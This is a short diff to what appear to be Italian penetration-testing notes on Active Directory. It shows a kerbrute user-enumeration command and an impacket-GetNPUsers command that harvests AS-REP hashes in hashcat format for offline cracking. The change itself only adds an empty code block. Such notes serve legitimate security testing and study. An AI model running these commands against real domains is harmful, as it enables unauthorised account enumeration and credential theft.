@@ -12,6 +12,10 @@ kerbrute userenum -d <NOME DOMINIO> --dc <IP DC> <LISTA>
 ![[Pasted image 20230510110607.png]]
 ### **TGT**
 ```bash
+
+```
+
+```bash
 impacket-GetNPUsers '<NOME DOMINIO>/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
 ```
 ==L'HASH VIENE MESSO NEL FILE DI OUTPUT==
